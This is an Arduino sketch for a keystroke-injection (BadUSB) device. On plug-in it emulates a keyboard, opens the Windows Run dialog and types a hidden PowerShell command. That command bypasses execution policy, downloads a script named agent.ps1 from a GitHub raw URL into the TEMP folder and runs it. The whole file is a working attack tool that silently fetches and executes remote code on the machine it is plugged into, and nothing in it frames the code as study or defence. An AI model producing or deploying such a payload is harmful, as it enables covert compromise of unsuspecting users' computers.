#include <Keyboard.h>

#define LEDPIN 11   // adjust to your clone's onboard LED, cosmetic only

// ---- CONFIG ----
const char* CMD = "powershell -w hidden -ep bypass -c \"iwr https://raw.githubusercontent.com/HaluchaYT/agents/refs/heads/main/agent.ps1 -outf $env:TEMP\\a.ps1;& $env:TEMP\\a.ps1\"";
const unsigned long ENUM_DELAY = 3000;
const unsigned long RUN_DELAY  = 1200;
const unsigned long TYPE_DELAY = 12;
// ----------------

void typeSlow(const char* s) {
  for (const char* p = s; *p; p++) { Keyboard.print(*p); delay(TYPE_DELAY); }
}

void setup() {
  pinMode(LEDPIN, OUTPUT);
  delay(ENUM_DELAY);
  Keyboard.begin();
  delay(400);
  digitalWrite(LEDPIN, HIGH);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();
  delay(RUN_DELAY);

  typeSlow(CMD);
  delay(200);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();

  delay(1500);
  digitalWrite(LEDPIN, LOW);
  Keyboard.end();
}

void loop() { delay(1000); }